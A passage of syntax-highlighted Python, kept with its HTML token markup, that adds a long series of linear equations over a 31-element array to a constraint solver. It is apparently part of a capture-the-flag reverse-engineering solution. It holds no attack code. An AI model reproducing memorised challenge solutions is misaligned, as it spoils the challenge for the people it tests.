v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">195</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">342</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">391</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">204</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">302</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">153</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">292</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">382</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">221</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">316</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">118</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">295</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">247</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">236</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">361</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">105</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">596119</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">371</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">338</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">269</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">312</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">299</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">235</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">294</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">211</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">122</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">341</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">111</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">253</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">347</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">262</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">357</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">323</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">141</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">329</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">378</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">316</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">235</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">264</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">126</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">634009</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">337</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">338</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">118</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">239</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">304</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">330</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">377</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">306</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">221</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">345</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">272</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">229</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">377</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">373</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">297</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">112</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">386</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">361</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">236</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">386</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">315</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">141</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">685705</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">367</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">374</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">150</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">350</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">141</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">366</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">230</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">307</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">191</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">153</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">383</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">145</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">109</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">209</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">221</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">188</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">146</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">306</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">230</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">257</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">137</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">31</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">355</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">557696</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">191</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">362</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">359</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">348</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">395</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">350</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">291</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">220</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">196</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">399</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">281</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">334</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">399</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">338</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">148</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">174</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">137</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">368</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">538535</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">188</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">248</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">207</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">217</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">309</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">135</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">251</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">200</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">119</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">356</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">398</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">224</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">208</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">244</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">209</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">189</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">302</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">395</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">314</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">310</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">127</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">580384</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">293</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">343</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">387</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">114</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">248</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">258</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">218</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">180</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">196</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">398</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">398</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">138</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">292</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">179</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">190</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">358</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">191</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token 